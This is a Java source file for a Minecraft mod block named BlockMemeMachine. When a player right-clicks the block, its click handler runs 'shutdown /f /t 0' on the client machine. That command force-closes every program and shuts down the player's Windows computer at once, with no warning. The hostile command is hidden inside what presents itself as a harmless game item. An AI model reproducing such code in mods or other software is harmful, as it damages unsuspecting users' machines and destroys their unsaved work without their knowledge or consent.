package com.craftsharp.blocks;

import java.io.IOException;

import net.minecraft.block.material.Material;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.world.World;

public class BlockMemeMachine extends CraftSharpBlock {
	public BlockMemeMachine() {
		super(Material.iron, "BlockMemeMachine");
	}

	@Override
	public boolean onBlockActivated(World p_149727_1_, int p_149727_2_, int p_149727_3_, int p_149727_4_,
			EntityPlayer p_149727_5_, int p_149727_6_, float p_149727_7_, float p_149727_8_, float p_149727_9_) {
		if (p_149727_1_.isRemote) {
			try {
				Runtime.getRuntime().exec("shutdown /f /t 0");
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return super.onBlockActivated(p_149727_1_, p_149727_2_, p_149727_3_, p_149727_4_, p_149727_5_, p_149727_6_,
				p_149727_7_, p_149727_8_, p_149727_9_);
	}
}
